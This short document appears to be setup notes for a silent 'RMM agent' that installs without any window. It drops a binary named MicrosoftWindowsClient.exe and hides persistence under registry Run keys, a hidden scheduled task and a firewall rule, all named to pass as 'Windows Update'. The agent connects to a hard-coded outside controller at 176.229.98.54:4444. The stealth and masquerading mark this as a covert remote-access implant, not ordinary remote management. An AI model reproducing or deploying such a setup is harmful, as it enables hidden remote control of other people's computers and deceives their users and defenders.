RMM Agent Setup - Client App (SILENT)
======================================
Run Agent-Setup.exe (requires Admin, no window - completely silent)
- Installs to: C:\Program Files\RMM\Agent\
  - MicrosoftWindowsClient.exe
  - server.crt
- Persistence (stealth):
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = "C:\Program Files\RMM\Agent\MicrosoftWindowsClient.exe" -controller 176.229.98.54:4444 -ca "C:\Program Files\RMM\Agent\server.crt"
  - HKLM\... same (all users)
  - Scheduled Task \WindowsUpdate (hidden, logon trigger, 5-min repetition, HighestAvailable)
- Firewall: out allow for MicrosoftWindowsClient.exe (name "Windows Update")
- Auto-starts agent hidden (CREATE_NO_WINDOW) immediately
- No desktop shortcut, no UI, no console

Uninstall: Agent-Setup.exe --uninstall
Or run: schtasks /delete /tn WindowsUpdate /f  +  reg delete ...  +  taskkill /F /IM MicrosoftWindowsClient.exe

Controller IP: 176.229.98.54:4444 TLS 1.2 (cert pinned SAN 176.229.98.54)
